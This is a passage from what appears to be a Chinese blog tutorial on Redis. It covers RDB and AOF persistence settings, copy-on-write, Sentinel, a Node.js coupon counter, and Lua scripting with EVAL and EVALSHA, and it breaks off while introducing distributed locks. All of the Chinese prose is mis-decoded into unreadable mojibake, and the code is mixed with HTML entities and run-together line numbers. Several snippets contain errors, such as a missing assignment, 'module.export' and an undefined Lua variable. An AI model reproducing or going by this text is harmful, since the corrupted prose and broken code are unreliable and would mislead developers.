å·¥ä½œç›®å½•ï¼ˆä¸Šé¢ dump-6379.rdb æ–‡ä»¶ä¿å­˜ç›®å½•ï¼‰dir /data/soft/redis-5.0.5/data/# å¤‡ä»½è¿›ç¨‹å‡ºé”™ï¼Œä¸»è¿›ç¨‹åœæ­¢å†™å…¥stop-writes-on-bgsave-error yes# æ˜¯å¦åŽ‹ç¼©rdbcompression yes# å¯¼å…¥æ—¶æ˜¯å¦æ£€æŸ¥rdbchecksum yes 1234567891011121314127.0.0.1:6379&gt; saveOK127.0.0.1:6379&gt; bgsaveBackground saving started# æœåŠ¡ç«¯[35856] 02 Jul 10:01:02.999 * 1 changes in 3600 seconds. Saving...[35856] 02 Jul 10:01:03.063 * Background saving started by pid 58172[35856] 02 Jul 10:01:03.263 # fork operation complete[35856] 02 Jul 10:01:03.263 * Background saving terminated with success[35856] 02 Jul 10:30:56.240 * DB saved on disk[35856] 02 Jul 10:31:03.565 * Background saving started by pid 53904[35856] 02 Jul 10:31:03.705 # fork operation complete[35856] 02 Jul 10:31:03.705 * Background saving terminated with success ä¸è¶³æ€§èƒ½ã€æ—¶é—´è€—æ—¶ï¼Œå­˜åœ¨ä¸ç¨³å®šæ€§ RDBç”Ÿæˆçš„è¿‡ç¨‹å°±æ˜¯å°†Rediså†…å­˜ä¸­çš„dumpåˆ°ç¡¬ç›˜ç”Ÿæˆä¸€ä¸ªRDBæ–‡ä»¶ï¼Œå…¶å®žå°±æ˜¯ç”Ÿæˆä¸€ä¸ªå†…å­˜å¿«ç…§ï¼Œsaveä¼šé€ æˆé˜»å¡žï¼Œä¸å»ºè®®ç”Ÿäº§çŽ¯å¢ƒåŽ»ä½¿ç”¨ã€‚besaveçš„forkä¹Ÿæ˜¯ä¸€ä¸ªé‡é‡çº§æ“ä½œï¼Œéµå¾ªcopy-on-writeï¼ˆå†™å…¥æ—¶å¤åˆ¶ï¼‰ç­–ç•¥ï¼Œæ–°forkå‡ºçš„å­è¿›ç¨‹ä¼šç»§ç»­å…±äº«çˆ¶è¿›ç¨‹çš„ç‰©ç†ç©ºé—´ï¼Œä½¿ç”¨COWæŠ€æœ¯å¯ä»¥é¿å…ä¸å¿…è¦çš„èµ„æºåˆ†é…ï¼Œçˆ¶è¿›ç¨‹çš„ä»£ç æ®µå’Œåªè¯»æ•°æ®æ®µéƒ½ä¸å…è®¸ä¿®æ”¹ï¼Œæ‰€ä»¥æ— éœ€å¤åˆ¶ï¼Œå½“çˆ¶è¿›ç¨‹å¤„ç†äº›è¯·æ±‚æ—¶ä¼šæŠŠè¦ä¿®æ”¹çš„é¡µåˆ›å»ºå‰¯æœ¬ï¼Œè€Œå­è¿›ç¨‹åœ¨forkè¿‡å†²ä¸­ä¼šå…±äº«çˆ¶è¿›ç¨‹çš„å†…å­˜å¿«ç…§ Copy on WriteæŠ€æœ¯å®žçŽ°åŽŸç†ï¼šforkä¹‹åŽï¼ŒkernelæŠŠçˆ¶è¿›ç¨‹ä¸­æ‰€æœ‰çš„å†…å­˜é¡µçš„æƒé™éƒ½è®¾ä¸ºread-only,ç„¶åŽå­è¿›ç¨‹çš„åœ°å€ç©ºé—´æŒ‡å‘çˆ¶è¿›ç¨‹ã€‚å½“çˆ¶å­è¿›ç¨‹éƒ½åªè¯»å†…å­˜æ—¶ï¼Œç›¸å®‰æ— äº‹ã€‚å½“å…¶ä¸­æŸä¸ªè¿›ç¨‹å†™å…¥å†…å­˜æ—¶ï¼ŒCPUç¡¬ä»¶æ£€æµ‹åˆ°å†…å­˜é¡µæ˜¯read-only,äºŽæ˜¯è§¦å‘é¡µå¼‚å¸¸ä¸­é—´ï¼ˆpage-faultï¼‰ï¼Œé™·å…¥kernelçš„ä¸€ä¸ªç»ˆç«¯ä¾‹ç¨‹ã€‚ä¸­æ–­ä¾‹ç¨‹ä¸­ï¼Œkernalå°±ä¼šæŠŠè§¦å‘çš„å¼‚å¸¸çš„é¡µå¤åˆ¶ä¸€ä»½ï¼ŒäºŽæ˜¯åˆ†å­è¿›ç¨‹å„è‡ªæŒæœ‰ç‹¬ç«‹çš„ä¸€ä»½ COWæŠ€æœ¯å¯ä»¥å‡å°‘åˆ†é…å’Œå¤åˆ¶å¤§é‡èµ„æºæ—¶å¸¦æ¥çš„çž¬é—´å»¶è¿Ÿï¼Œå‡å°‘ä¸å¿…è¦çš„èµ„æºåˆ†é…ã€‚ å¦‚æžœåœ¨forkä¹‹åŽï¼Œçˆ¶å­è¿›ç¨‹è¿˜éœ€è¦è¿›è¡Œè¯»å†™æ“ä½œï¼Œé‚£ä¹ˆä¼šäº§ç”Ÿå¤§é‡çš„åˆ†é¡µé”™è¯¯ï¼ˆé¡µå¼‚å¸¸ä¸­æ–­page-faultï¼‰ï¼Œè¿™æ ·å°±å¾—ä¸å¿å¤±äº† Redisä¼šæ ¹æ®è‡ªå®šä¹‰æ—¶é—´ç­–ç•¥æˆ–è€…å®šæ—¶ä»»åŠ¡æ‰‹åŠ¨æ‰§è¡Œbesaveè¿›è¡Œå¿«ç…§å¤‡ä»½ï¼Œå¦‚æžœæŸä¸ªå‡ºçŽ°å®•æœºä¼šä¸¢å¤±éƒ¨åˆ†æ•°æ® AOFä»¥å†™æ—¥å¿—çš„æ–¹å¼æ‰§è¡Œrediså‘½ä»¤åŽï¼Œå°†æ•°æ®å†™å…¥AOFæ—¥å¿—æ–‡ä»¶ å¯é æ€§fsyncrediså‘½ä»¤å†™å…¥è¿‡ç¨‹ï¼Œæ˜¯å…ˆå†™å…¥ç¡¬ç›˜çš„ç¼“å†²åŒºï¼Œç¼“å†²åŒºæ ¹æ®é€‰æ‹©çš„ç­–ç•¥å†™å…¥åˆ°ç³»ç»Ÿä¸­ï¼Œlinuxçš„glibcæä¾›äº†fsyncï¼ˆinit fdï¼‰å‡½æ•°å¯ä»¥å°†æŒ‡å®šæ–‡ä»¶çš„å†…å®¹å¼ºåˆ¶ä»Žå†…æ ¸å†™å…¥è‡³ç£ç›˜ï¼Œåªè¦redisè¿›ç¨‹å®žæ—¶è°ƒç”¨äº†fsyncå‡½æ•°å°±å¯ä»¥ä¿è¯AOFæ—¥å¿—ä¸ä¸¢å¤±ï¼Œç”±äºŽfsyncæ˜¯ä¸€ä¸ªç£ç›˜I/Oæ“ä½œï¼Œæ‰€ä»¥ä¸èƒ½æ¯æ¡redisæŒ‡ä»¤éƒ½æ‰§è¡Œä¸€æ¬¡fsyncï¼Œè¿™æ ·redisé«˜æ€§èƒ½å°±æ²¡æœ‰ä¿è¯ï¼Œæœ‰ä¸‰ç§ç­–ç•¥ï¼Œé»˜è®¤æŽ¨èeverysecç­–ç•¥ï¼š alwaysï¼šæ¯æ¡å‘½ä»¤éƒ½ä¼šå†™å…¥AOFä¸­ï¼Œä¿è¯æ•°æ®ä¸ä¼šä¸¢å¤±ï¼Œä½†æ˜¯I/Oå¼€é”€ä¼šå¾ˆå¤§ everysecï¼šä»¥æ¯ç§’é’Ÿä¸ºå•ä½å°†ç¼“å†²åŒºä¸­çš„æ•°æ®å†™å…¥åˆ°ç¡¬ç›˜ï¼Œå¦‚æžœå‡ºçŽ°æ•…éšœå¯èƒ½ä¼šä¸¢å¤±1ç§’é’Ÿçš„æ•°æ®ï¼Œè¿™ä¸ªä¹Ÿæ˜¯Redisçš„é»˜è®¤å€¼ noï¼šè¿™ä¸ªç­–ç•¥æ ¹æ®æ“ä½œç³»ç»Ÿå®šä¹‰çš„è¿›è¡Œå†™å…¥ï¼Œä¸éœ€è¦æ“ä½œï¼Œä½†åŒæ—¶ä¹Ÿæ˜¯ä¸å¯æŽ§çš„ã€‚ é‡å†™å°†é‚£äº›è¿‡æœŸã€é‡å¤çš„å‘½ä»¤è¿›è¡ŒåŽ‹ç¼©å‡å°‘ï¼Œä»Žè€Œè¾¾åˆ°å‡å°‘ç¡¬ç›˜å ç”¨é‡ï¼Œæé«˜æ•°æ®æ¢å¤é€Ÿåº¦ å®žçŽ°æ–¹å¼ï¼š bgrewriteaof:ç±»ä¼¼äºŽRDBä¸­çš„bgsave auto-aof-rewrite-min-sizeï¼šé…ç½®AOFé‡å†™éœ€è¦çš„æœ€å°å°ºå¯¸ auto-aof-rewrite-percentageï¼šé…ç½®AOFæ–‡ä»¶å¢žé•¿çŽ‡ é…ç½® 123456789101112131415161718192021# æ˜¯å¦å¼€å¯ aofappendonly yes# æ–‡ä»¶åç§°appendfilename "appendonly-6379.aof"# åŒæ­¥æ–¹å¼appendfsync everysec# aof é‡å†™æœŸé—´æ˜¯å¦åŒæ­¥no-appendfsync-on-rewrite no# é‡å†™è§¦å‘é…ç½®auto-aof-rewrite-percentage 100auto-aof-rewrite-min-size 64mb# åŠ è½½ aof æ—¶å¦‚æžœæœ‰é”™å¦‚ä½•å¤„ç†aof-load-truncated yes# æ–‡ä»¶é‡å†™ç­–ç•¥aof-rewrite-incremental-fsync yes æ•°æ®æŸåä¿®å¤â€œåœ¨è¿‡åŽ»æ›¾ç»å‘çŽ°ä¸€äº›å¾ˆç½•è§çš„ BUG å¯¼è‡´ä½¿ç”¨ AOF é‡å»ºçš„æ•°æ®è·ŸåŽŸæ•°æ®ä¸ä¸€è‡´çš„é—®é¢˜ã€‚â€ è¿™å¥è¯æ¥è‡ª Redis å®žè·µå®˜æ–¹ï¼Œä¸ºäº†åº”å¯¹è¿™ç§ç½•è§çš„ BUG å¯ä»¥ä½¿ç”¨ redis-check-aof å‘½ä»¤ä¿®å¤åŽŸå§‹çš„ AOF æ–‡ä»¶ 1redis-check-aof --fix appendonly-6379.aof # appendonly-6379.aof å¯¹åº”ä½ çš„ aof æ—¥å¿—æ–‡ä»¶ é€‰æ‹© é‡æ”¾ä¼˜å…ˆçº§ï¼šç³»ç»Ÿé‡å¯æ—¶ä¼˜å…ˆé‡æ”¾AOFå¤‡ä»½æ•°æ®ï¼ŒéšåŽæ˜¯RDB,å› ä¸ºä»Žæ•°æ®å¤‡ä»½çš„å®Œæ•´æ€§è€ƒè™‘ï¼ŒAOFç›¸æ¯”RDBå¯é æ€§æ›´é«˜äº› æ¢å¤é€Ÿåº¦å¿«ï¼šRDBé‡‡ç”¨äºŒè¿›åˆ¶æ–¹å¼å­˜å‚¨å ç”¨ä½“ç§¯å°ï¼ŒAOFæ˜¯ä»¥æ—¥å¿—å½¢å¼å­˜å‚¨ï¼Œä½“ç§¯ç›¸æ¯”RDBè¦å¤§ï¼Œç›¸æ¯”è¾ƒæ¥è¯´ï¼ŒRDBçš„æ•°æ®æ¢å¤é€Ÿåº¦è¦é«˜äºŽAOF æ•°æ®å®‰å…¨æ€§ï¼šRDBé‡‡ç”¨å¿«ç…§å½¢å¼ï¼Œåœ¨ä¸€å®šæ—¶é—´å†…ä¼šä¸¢å¤±æ•°æ®ï¼ŒAOFç›¸å¯¹æ›´å®‰å…¨äº›ï¼Œä¸»è¦æœ‰ä¸‰ç§ç­–ç•¥ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œåº”è¯¥åŒæ—¶ä½¿ç”¨ä¸¤ç§æŒä¹…åŒ–åŠŸèƒ½ï¼Œå¦‚æžœå¯ä»¥æ‰¿å—æ•°åˆ†é’Ÿä»¥å†…çš„æ•°æ®ä¸¢å¤±ï¼Œå¯ä»¥åªä½¿ç”¨RDBæŒä¹…åŒ–ã€‚å¾ˆå¤šç”¨æˆ·éƒ½åªä½¿ç”¨AOFæŒä¹…åŒ–ï¼Œè€Œå®šæ—¶ç”ŸæˆRDBéžå¸¸ä¾¿äºŽè¿›è¡Œæ•°æ®åº“å¤‡ä»½ï¼Œå¹¶ä¸”RDBæ¢å¤æ•°æ®é›†çš„é€Ÿåº¦ä¹Ÿè¦æ¯”AOFæ¢å¤çš„é€Ÿåº¦è¦å¿«ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œä½¿ç”¨RDBè¿˜å¯ä»¥é¿å…ä¹‹å‰è¯´è¿‡çš„AOFbugã€‚ å“¨å…µé«˜å¯ç”¨ä¸»ä»Žå¤åˆ¶å¦‚æžœä¸»èŠ‚ç‚¹å‘ç”Ÿæ•…éšœï¼ŒRedis SentinelåŠŸèƒ½å¯ä»¥è‡ªåŠ¨æå‡è€Œä¸æ˜¯äººå·¥å¹²é¢„ Sentinelæ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿï¼Œç±»ä¼¼äºŽCousulé›†ç¾¤ï¼Œä¸€èˆ¬ç”±3~5ä¸ªèŠ‚ç‚¹ç»„æˆï¼Œä½¿ç”¨Raftç®—æ³•å®žçŽ°é¢†å¯¼è€…é€‰ä¸¾å› ä¸ºæ•…éšœè½¬ç§»åªéœ€è¦ä¸€ä¸ªSentinelèŠ‚ç‚¹æ¥å®Œæˆ ä¸ºä»€ä¹ˆRedisåªé€‚ç”¨äºŽç¼“å­˜è€Œä¸èƒ½å½“åšæ•°æ®åº“æ¥ä½¿ç”¨ï¼Ÿ æ€§èƒ½ï¼šRedisæ˜¯ä¸€ä¸ªåŸºäºŽå†…å­˜çš„æ•°æ®åº“ï¼Œé€šå¸¸ç”¨æ¥è®¡æ•°å™¨ã€Sessionå­˜å‚¨ã€ç¼“å­˜è®¾è®¡ç­‰ç­‰ æˆæœ¬ï¼šå‡è®¾ç™¾ä¸‡æ¡æ•°æ®ï¼Œä»…1%æ˜¯çƒ­ç‚¹æ•°æ®å…¶ä½™éƒ½æ˜¯å†·æ•°æ®ï¼Œè¿™ç§æƒ…å†µå…¨éƒ¨éƒ½å­˜åœ¨Redisé‡Œé¢ï¼Œæ˜¯èµ„æºçš„æµªè´¹ï¼Œä»Žç¼“å­˜è®¾è®¡è§’åº¦æ¥è¯´ï¼Œæ‰€ä¿å­˜çš„ä¹Ÿä»…æ˜¯çƒ­ç‚¹æ•°æ® çµæ´»æ€§ï¼šRedisçš„æ•°æ®ç»“æž„æ˜¯ä¸°å¯Œçš„ï¼Œæ”¯æŒString,HashTable,List,Set,Zsetè¿˜æœ‰æœ€æ–°çš„BitMaps.GEOç­‰ï¼Œå¦‚æžœæœ‰å¾ˆå¤æ‚çš„æŸ¥è¯¢è¯­å¥ï¼Œå…³è”æŸ¥è¯¢ç­‰ï¼Œè¿˜æ˜¯SQLç­‰æ•°æ®åº“æ›´åŠ åˆé€‚ æ•°æ®å¯é æ€§ï¼šç¬¬ä¸€ç§æ–¹å¼æ˜¯Redis+RDBï¼Œå¦‚æžœå‘ç”Ÿæ–­ç”µï¼Œè‡ªä¸Šæ¬¡æŒä¹…åŒ–åˆ°æœ€æ¬¡ä¸€æ¬¡æ•…éšœä¹‹é—´çš„æ•°æ®ä¸¢å¤±ã€‚ç¬¬äºŒç§æ˜¯Redis+AOFï¼ŒAOFæœ‰ä¸‰ç§ç­–ç•¥å°†æ•°æ®æŒä¹…åŒ–åˆ°ç£ç›˜ï¼Œå…¶ä¸­everysecæ˜¯ç›¸å¯¹æŠ˜ä¸­çš„ä¸€ç§æ–¹æ¡ˆï¼ŒeverysecæŠ˜ä¸­æ–¹æ¡ˆä¹Ÿä¼šå­˜åœ¨1ç§’é’Ÿæ•°æ®ä¸¢å¤±çš„é—®é¢˜ã€‚ å®žè·µ1â€”â€”è®¡æ•°å™¨å®žçŽ°å¹¶å‘åœºæ™¯ä¸‹çš„ä¼˜æƒ åˆ¸é¢†å–åŠŸèƒ½è®¡æ•°å™¨åœ¨å®žé™…ä¸­æœ‰å¾ˆå¤šéœ€æ±‚ï¼šPV/UVã€æŽ¥å£å¹¶å‘é™åˆ¶ã€æŠ½å¥–ã€ä¼˜æƒ åˆ¸é¢†å–ç­‰ ä¸šåŠ¡èƒŒæ™¯ä¸šåŠ¡éœ€æ±‚æ–¹åšä¼˜æƒ åˆ¸å‘æ”¾æ´»åŠ¨ï¼Œå…±ä¼˜æƒ åˆ¸10å¼ ï¼Œå‚ä¸Žç”¨æˆ·100äººï¼Œå…ˆåˆ°å…ˆå¾—ï¼Œå‡è®¾æ¯æ¬¡å¹¶å‘20ç”¨æˆ·åŒæ—¶è®¿é—®ï¼Œå¦‚ä½•ä¿è¯ä¸è¶…é¢†å– ç›¸å…³å‘½ä»¤ existsï¼šåˆ¤æ–­æŒ‡å®škeyæ˜¯å¦å­˜åœ¨ setnxï¼šè®¾ç½®å€¼ï¼Œè‹¥å€¼å­˜åœ¨ä¸åšä»»ä½•å¤„ç† incrï¼šè®¡æ•° æ¯å‘é€ä¸€æ¬¡é¢†å–è¯·æ±‚ï¼Œé‡‡ç”¨incrå‘½ä»¤è¿›è¡Œè‡ªå¢žï¼Œç”±äºŽrediså•çº¿ç¨‹çš„åŽŸå› ï¼Œå¯ä»¥ä¿è¯åŽŸå­æ€§ï¼Œä¸ä¼šå‡ºçŽ°è¶…é¢† 123456789101112131415161718192021222324252627282930313233343536373839404142434445// luck.jsconst Redis = require('redis');const redis = new Redis(6379,'127.0.0.1');// å°†æ—¥å¿—å†™å…¥æŒ‡å®šæ–‡ä»¶const fs = require('fs');const &#123;Console&#125; = require('console');const output = fs.createWriteStream('./stdout.js')const errorOutput fs.createWriteStream('./stderr.js')const logger = new Console(output,errorOutput);async function luck()&#123; const count = 10; const key = 'counter:luck'; const keyExists = await redis.exists(key); if(!keyExists)&#123; // å¦‚æžœkeyä¸å­˜åœ¨åˆå§‹åŒ–è®¾ç½® await redis.setnx(key,0); &#125; // å¢žåŠ é¢†å–æ•°é‡ const result = await redis.incr(key); if(result &gt; count)&#123; // ä¼˜æƒ åˆ¸é¢†å–è¶…é™ logger.error('luck failure',result); return; &#125; logger.info('luck success',result);&#125;module.export = luck;// app.jsconst http = require('http');const luck = require('./luck');http.createServer((req,res)=&gt;&#123; if(req.url === 'luck')&#123; luck(); res.end('ok') &#125;&#125;).listen(3000) å®žè·µ2â€”â€”Redis Luaè„šæœ¬Luaæ˜¯ä¸€ç§è½»é‡å°å·§çš„è„šæœ¬è¯­è¨€ï¼Œç”¨æ ‡å‡†cè¯­è¨€ç¼–å†™å¹¶ä»¥æºä»£ç å½¢å¼å¼€æ”¾ï¼Œè®¾è®¡ç›®çš„æ˜¯ä¸ºåµŒå…¥åº”ç”¨ç¨‹åºä¸­ï¼Œä»Žè€Œä¸ºåº”ç”¨ç¨‹åºæä¾›çµæ´»çš„æ‰©å¼ å’Œå®šåˆ¶åŠŸèƒ½ã€‚ç”±äºŽLuaè¯­è¨€å…·æœ‰åŽŸå­æ€§ï¼Œå…¶åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¸ä¼šè¢«å…¶ä»–ç¨‹åºæ‰“æ–­ï¼Œå¯¹äºŽå¹¶å‘ä¸‹çš„æ•°æ®ä¸€è‡´æ€§æœ‰ä¸€å®šçš„å¸®åŠ© ä¸¤ç§Luaè„šæœ¬Redisæ”¯æŒä¸¤ç§è¿è¡ŒLuaè„šæœ¬ï¼Œä¸€ç§æ˜¯ç›´æŽ¥Redisä¸­è¾“å…¥Luaä»£ç ï¼Œé€‚ç”¨äºŽä¸€äº›ç®€å•çš„è„šæœ¬ï¼Œå¦ä¸€ç§æ–¹å¼æ˜¯ç¼–å†™Luaè„šæœ¬æ–‡ä»¶ï¼ŒRedisä½¿ç”¨SHA1ç®—æ³•æ”¯æŒå¯¹è„šæœ¬ç­¾åå’ŒScript Load é¢„å…ˆç¼“å­˜ï¼Œéœ€è¦è¿è¡Œçš„æ—¶å€™é€šè¿‡ç­¾åè¿”å›žçš„æ ‡è¯†ç¬¦å³å¯ã€‚ EVALé€šè¿‡å†…ç½®çš„Luaè§£é‡Šå™¨ï¼Œå¯ä»¥ä½¿ç”¨EVALå‘½ä»¤å¯¹Luaè„šæœ¬è¿›è¡Œæ±‚å€¼ scriptï¼šæŒ‡å®šè„šæœ¬ numkeysï¼šæŒ‡å®šé”®åé¤å‚æ•°ä¸ªæ•° keyï¼šé”®åï¼Œå¯ä»¥å¤šä¸ªkey,é€šè¿‡KEYS[1]KEYS[2]çš„å½¢å¼è®¿é—® atgï¼šé”®å€¼ï¼Œå¯ä»¥å¤šä¸ªvalï¼Œé€šARGS[1]ARGS[2]çš„å½¢å¼è®¿é—® 1234567EVAL script numkeys key[key...] arg[arg...]# é€šè¿‡KEYS[] æ•°ç»„çš„å½¢å¼è®¿é—®ARGV[],ä¸‹æ ‡æ˜¯ä»Ž1å¼€å§‹ï¼ŒKEYS[1]å¯¹åº”çš„é”®åä¸ºname1,ARGV[2]å¯¹åº”çš„å€¼ä¸ºval2127.0.0.1:6379&gt; EVAL "return redis.call('SET',KEYS[1],ARGV[2])" 2 name1 name2 val1 val2OK127.0.0.1:6379&gt; get name1"val2" redis.callä½•redis.pcallæ˜¯ä¸¤ä¸ªä¸åŒçš„Luaå‡½æ•°æ¥è°ƒç”¨rediså‘½ä»¤ï¼ŒåŒºåˆ«æ˜¯å¦‚æžœrediså‘½ä»¤ä¸­å‡ºçŽ°é”™è¯¯å¼‚å¸¸ï¼Œredis.callä¼šç›´æŽ¥è¿”å›žä¸€ä¸ªé”™è¯¯ä¿¡æ¯ç»™è°ƒç”¨è€…ï¼Œè€Œredis.pcallä¼šä»¥Luaçš„å½¢å¼å¯¹é”™è¯¯è¿›è¡Œæ•èŽ·å¹¶è¿”å›ž 123456789# è¿™é‡Œæ‰§è¡Œäº†ä¸¤æ¡ Redis å‘½ä»¤ï¼Œç¬¬ä¸€æ¡æ•…æ„å†™äº†ä¸€ä¸ª SET_ è¿™æ˜¯ä¸€ä¸ªé”™è¯¯çš„å‘½ä»¤ï¼Œå¯ä»¥çœ‹åˆ°å‡ºé”™åŽï¼Œé”™è¯¯ä¿¡æ¯è¢«æŠ›å‡ºç»™äº†è°ƒç”¨è€…ï¼ŒåŒæ—¶ä½ æ‰§è¡Œ get name2 ä¼šå¾—åˆ° (nil)ï¼Œç¬¬äºŒæ¡å‘½ä»¤ä¹Ÿæ²¡æœ‰è¢«æ‰§è¡Œ# redis.call127.0.0.1:6379&gt; EVAL "redis.call('SET_', KEYS[1], ARGV[2]); redis.call('SET', KEYS[2], ARGV[3])" 2 name1 name2 val1 val2 val3(error) ERR Error running script (call to f_bf814e38e3d98242ae0c62791fa299f04e757a7d): @user_script:1: @user_script: 1: Unknown Redis command called from Lua script # redis.pcall# ä¸€æ ·çš„æ“ä½œï¼Œå¯ä»¥çœ‹åˆ°è¾“å‡ºç»“æžœä¸ºnilï¼Œå®ƒçš„é”™è¯¯è¢«Luaæ•èŽ·äº†ï¼Œåœ¨æ‰§è¡Œget name2 ä¼šå¾—åˆ°ä¸€ä¸ªè®¾ç½®å¥½çš„ç»“æžœval3ï¼Œè¿™é‡Œç¬¬äºŒæ¡å‘½ä»¤æ˜¯è¢«æ‰§è¡Œäº†çš„EVAL "redis.pcall('SET_', KEYS[1], ARGV[2]); redis.pcall('SET', KEYS[2], ARGV[3])" 2 name1 name2 val1 val2 val3(nil) Nodejså®žçŽ°1234567891011121314151617// ioredis æ”¯æŒæ‰€æœ‰è„šæœ¬å‘½ä»¤ï¼Œæ¯”å¦‚EVAL/EVALSHA/SCRIPT,åœ¨çŽ°å®žåœºæ™¯ä¸­ä½¿ç”¨å®ƒæ˜¯å¾ˆç¹ççš„ï¼Œè¦æ³¨æ„è„šæœ¬ç¼“å­˜ï¼Œå¹¶æ£€æµ‹ä½•æ—¶ä½¿ç”¨EVALã€EVALSHA.iorediså…¬å¼€äº†ä¸€ä¸ªdefineCommandæ–¹æ³•ï¼Œä½¿å¾—è„šæœ¬æ›´å®¹æ˜“ä½¿ç”¨const Redis = require('ioredis');const redis = new Redis(6379,'127.0.0.1');const evalScript = "return redis.call('SET',KEYS[1],ARGV[2])";redis.defineCommand('evalTest',&#123; numberOfKeys:2, lua:evalScript&#125;);async function eval()&#123; await redis.evalTest('name1','name2','val1','val2'); const result = await redis.get('name1'); console.log(result) // val2&#125;eval(); EVALSHAEVALå‘½ä»¤è¦æ±‚æ¯æ¬¡æ‰§è¡Œè„šæœ¬çš„æ—¶å€™éƒ½å‘é€ä¸€æ¬¡è„šæœ¬ä¸»ä½“script bodyã€‚Redisæœ‰ä¸€ä¸ªå†…éƒ¨ç¼“å­˜æœºåˆ¶ï¼Œå› æ­¤å®ƒä¸ä¼šæ¯æ¬¡éƒ½é‡æ–°ç¼–è¯‘è„šæœ¬ï¼Œé€šè¿‡EVALSHAæ¥å®žçŽ°ï¼Œæ ¹æ®ç»™å®šçš„SHA1æ ¡éªŒç ï¼Œå¯¹ç¼“å­˜åœ¨æœåŠ¡å™¨ä¸­çš„è„šæœ¬è¿›è¡Œæ±‚å€¼ SCRIPT FLUSHï¼šæ¸…é™¤æ‰€æœ‰è„šæœ¬ç¼“å­˜ SCRIPT EXISTSï¼šæ£€æŸ¥æŒ‡å®šçš„è„šæœ¬æ˜¯å¦å­˜åœ¨äºŽè„šæœ¬ç¼“å­˜ SCRIPT LOADï¼šè®²ä¸€ä¸ªè„šæœ¬è½¬å…¥è„šæœ¬ç¼“å­˜ï¼Œä½†ä¸ç«‹å³è¿è¡Œå®ƒ SCRIPT KILLï¼šæ€æ­»å½“å‰æ­£åœ¨è¿è¡Œçš„è„šæœ¬ 12345678910111213EVALSHA sha1 numkeys key [key...] arg[arg...]# è½½å…¥è„šæœ¬ç¼“å­˜127.0.0.1:6379&gt; SCRIPT LOAD "redis.pcall('SET',KEYS[1],ARGV[2])""3b2c59b4e98a20a3a9e631fb586218e7b70f1020"# ç”Ÿæˆçš„SHA-1ç­¾åçš„æ ‡è¯†å­—ç¬¦ä¸²ç”¨äºŽæ‰§è¡Œä¹‹åŽçš„è„šæœ¬127.0.0.1:6379&gt; EVALSHA 3b2c59b4e98a20a3a9e631fb586218e7b70f1020 2 name11 name12 val11 val12(nil)127.0.0.1:6379&gt; get name11"val12" nodejså®žçŽ°1234567891011121314151617const Redis = require('ioredis');const redis = new Redis(6379,'127.0.0.1');const evalScript = "return redis.call('SET'ï¼ŒKEY1[1],ARGV[2])";async function evalSHA()&#123; // 1.ç¼“å­˜è„šæœ¬èŽ·å–sha1å€¼ const sha1 = await redis.script('load',evalScript); // 2.é€šè¿‡evalshaæ‰§è¡Œè„šæœ¬ await redis.evalsha(sha1,2,'name1','name2','val1','val2'); // 3.èŽ·å–æ•°æ® const result = await redis.get('name1'); console.log(result); // val2&#125;evalSHA(); Luaè„šæœ¬æ–‡ä»¶æœ‰é€»è¾‘è¿ç®—çš„è„šæœ¬ï¼Œå¯ä»¥ç¼–å†™Luaè„šæœ¬æ–‡ä»¶ ä¸‹é¢æ˜¯ä¸€ä¸ªæµ‹è¯•ä»£ç ï¼Œé€šè¿‡è¯»å–ä¸¤ä¸ªå€¼æ¯”è¾ƒè¿”å›žä¸åŒçš„å€¼ï¼Œé€šè¿‡luaè„šæœ¬å®žçŽ°åŽå¯ä»¥å¤šæ¡rediså‘½ä»¤åŽŸå­æ€§ 1234567891011121314---test.lua-- å…ˆSETredis.call('SET',KEYS[1],ARGV[1])redis.call('SET',KEYS[2],ARGV[2])-- GET å–å€¼local key1 = tonumber(redis.call('GET',KEYS[1]));local key2 = tonumber(redis.call('GET',KEYS[2]));-- å¦‚æžœkey1 å°äºŽ key2è¿”å›ž0 nilç›¸å½“äºŽfalseif(key1 == nil or key == nil or key1 &lt; key2) then return 0 else return 1 end nodejsåŠ è½½luaè„šæœ¬æ–‡ä»¶123456789101112const Redis = require('ioredis');const redis = new Redis(6379,'127.0.0.1')const fs = require('fs')async function test()&#123; const redisLuaScript = fs.readFileSync('./test.lua'); const result1 = await redis.eval(redisLuaScript,2,'name1','nam2',20,10); const result2 = await redis.eval(redisLuaScript,2,'name1','nam2',10,20); console.log(result1,result2); // 1 0&#125;test(); å®žè·µ3â€”â€”Redisåˆ†å¸ƒå¼é”çº¿ç¨‹é”ï¼šå•çº¿ç¨‹ç¼–ç¨‹æ¨¡å¼ä¸‹è¯·æ±‚æ˜¯é¡ºåºçš„ï¼Œä¸€ä¸ªå¥½å¤„ä¸éœ€è¦è€ƒè™‘çº¿ç¨‹å®‰å…¨ã€èµ„æºç«žäº‰é—®é¢˜ è¿›ç¨‹é”ï¼šä¸€ä¸ªæœåŠ¡éƒ¨ç½²äºŽä¸€å°æœåŠ¡å™¨ï¼ŒåŒæ—¶å¼€å¯å¤šä¸ªè¿›ç¨‹ï¼Œnodejsä¸­ä¸ºäº†åˆ©ç”¨æ“ä½œç³»ç»Ÿèµ„æºï¼Œæ ¹æ®CPUçš„æ ¸å¿ƒæ•°å¯ä»¥å¼€å¯å¤šç¨‹æ¨¡å¼ï¼Œè¿™ä¸ªæ—¶å€™å¦‚æžœå¯¹äºŽä¸€ä¸ªå…±äº«èµ„æºæ“ä½œè¿˜æ˜¯ä¼šé‡åˆ°èµ„æºç«žäº‰çš„é—®é¢˜ï¼Œå¦å¤–æ¯ä¸€ä¸ªè¿›ç¨‹éƒ½æ˜¯ç›¸äº’ç‹¬ç«‹ï¼Œæ‹¥æœ‰è‡ªå·±ç‹¬ç«‹çš„å†…å­˜ç©ºé—´ï¼Œå…³äºŽè¿›ç¨‹é”é€šè¿‡javaçš„synchronizedä¹Ÿå¾ˆéš¾è§£å†³ï¼Œå®ƒä»…å±€é™åœ¨åŒä¸€ä¸ªJVMä¸­æœ‰æ•ˆ åˆ†å¸ƒå¼é”ï¼šä¸€ä¸ªæœåŠ¡æ— è®ºæ˜¯å•çº¿ç¨‹è¿˜æ˜¯å¤šè¿›ç¨‹æ¨¡å¼ï¼Œå½“å¤šæœºéƒ¨ç½²ã€å¤„äºŽåˆ†å¸ƒå¼çŽ¯å¢ƒä¸‹å¯¹ç»Ÿä¸€å…±äº«èµ„æºè¿›è¡Œæ“ä½œè¿˜æ˜¯ä¼šé¢ä¸´åŒæ 